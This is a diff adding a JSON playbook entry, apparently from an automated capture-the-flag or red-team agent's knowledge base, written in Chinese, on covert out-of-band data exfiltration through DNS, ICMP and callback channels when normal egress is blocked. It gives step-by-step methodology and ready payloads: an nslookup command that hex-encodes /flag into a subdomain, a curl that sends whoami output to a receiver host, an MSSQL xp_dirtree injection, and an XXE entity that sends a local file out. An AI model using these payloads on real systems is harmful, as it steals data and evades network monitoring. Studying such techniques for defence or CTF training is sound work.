@@ -1,0 +1,70 @@
+{
+  "id": "covert-channel-data-exfiltration",
+  "title": "出站受管控下的隐蔽外带 (DNS/ICMP/OOB 带外通道)",
+  "vuln_pattern": "常规出站(HTTP 直连回显)被管控、或漏洞无回显(盲注/内网到外网),但仍有可被滥用的隐蔽/非常规通道把 flag 或数据带出:把要外带的数据编码进 DNS 子域名查询 / ICMP payload / 白名单协议,由一个外部可控的 OOB 接收端(权威 DNS / 回连服务器)收下并重组。核心是'常规通道不通 -> 换带外通道 + 编码分片 + OOB 收数据'。",
+  "fingerprint": [
+    "隐蔽外带",
+    "数据外带",
+    "带外",
+    "外带通道",
+    "出站管控",
+    "出站受限",
+    "出网管控",
+    "出站通道",
+    "隐蔽通道",
+    "协议通道",
+    "非常规通道",
+    "covert channel",
+    "exfiltration",
+    "dns tunnel",
+    "dns外带",
+    "dns隧道",
+    "icmp外带",
+    "oob",
+    "out-of-band",
+    "盲注外带",
+    "无回显",
+    "内网外带",
+    "隐蔽信道"
+  ],
+  "exploit_steps": [
+    "判定为什么需要带外:常规回显/直连不可用(盲注、无回显、出站被封、内网到外网)。先花一条命令确认 HTTP 直连自己的服务器是否真被拦 —— 被拦才上隐蔽通道,别白折腾。",
+    "优先 DNS 外带(最常被放行):把数据编码后塞进子域名 <编码数据>.<你的域名>,触发一次 DNS 解析;递归解析会主动把查询送出内网,数据到你的权威 DNS / OOB 接收端。",
+    "编码与分片(DNS 硬约束):DNS 大小写不敏感 -> 必须用 hex 或 base32,绝不用 base64(大小写会丢);单 label <= 63 字节、整名 <= 253,长数据分多段、每段带序号,收端重组。",
+    "在漏洞点触发解析:命令注入用 nslookup/dig/curl 打 <数据>.域名;SQLi 用 DB 的带外原语(mysql LOAD_FILE UNC 路径 / mssql xp_dirtree / oracle UTL_HTTP);XXE 用外部实体把 file:///flag 拼进 OOB URL;SSRF/模板注入同理指向 OOB。",
+    "备选通道按目标实际放行的选:ICMP(数据进 ping payload)、HTTP 到白名单域/协作平台 webhook、某个放行端口。哪条通就用哪条。",
+    "用 OOB oracle 收数据并验证:本容器自带 OOB 接收端(环境变量 OOB_DOMAIN / OOB_HTTP_BASE,由 HXBAI_OOB 起),把外带目标指向它;收到回连即证通道成立,从回连记录里解码重组出 flag。"
+  ],
+  "key_payloads": [
+    "# 命令注入 DNS 外带(hex 编码 flag): F=$(cat /flag | xxd -p | tr -d '\\n'); nslookup $F.$OOB_DOMAIN",
+    "# 命令注入 HTTP OOB(直连自己的收端): curl $OOB_HTTP_BASE/$(whoami | base64 -w0)",
+    "# SQLi 带外(mssql xp_dirtree,把子查询结果拼进 UNC 主机名去触发 DNS): '; EXEC master..xp_dirtree '\\\\\\\\'+(SELECT TOP 1 flag FROM flags)+'.oob.example.com\\\\a'--",
+    "# XXE 外带本地文件: <!ENTITY % d SYSTEM \"file:///flag\"><!ENTITY % e \"<!ENTITY x SYSTEM 'http://OOB/?%d;'>\">%e;",
+    "# base32 分片(DNS 安全编码): echo -n DATA | base32 | tr -d '=' | fold -w40  # 逐段加序号后 nslookup"
+  ],
+  "category": "evasion",
+  "cve": [],
+  "tags": [
+    "evasion",
+    "exfiltration",
+    "covert-channel",
+    "dns-tunnel",
+    "oob",
+    "blind"
+  ],
+  "source": "seed: red-team covert-channel / OOB data exfiltration methodology",
+  "created_ts": 0.0,
+  "preconditions": [
+    "常规出站/回显不可用(盲、无回显、出站受管控),但存在至少一条非常规通道(DNS/ICMP/白名单协议)可被某个漏洞点触发。",
+    "有一个外部可控、可被目标环境到达的 OOB 接收端(权威 DNS 或回连 HTTP)。"
+  ],
+  "verify_oracle": "你的 OOB 接收端(权威 DNS / 回连 HTTP)收到带编码数据的请求,解码重组出 flag 或预期数据 —— 收到即证通道通、是真外带,不是猜测。",
+  "pitfalls": [
+    "没先确认常规出站真被拦就上隐蔽通道 -> 白折腾;先试一次 curl 直连自己的收端。",
+    "DNS 外带用 base64 -> 大小写丢失解不出;DNS 大小写不敏感,必须 hex 或 base32。",
+    "忽略 DNS label 63 字节 / 整名长度上限 -> 长 flag 被截断;必须分片加序号重组。",
+    "OOB 接收端不可达(没起 / 网络不通)-> 收不到;先用一段已知数据自测通道,再打真的。"
+  ],
+  "anti_fingerprint": [],
+  "source_tier": "seed"
+}
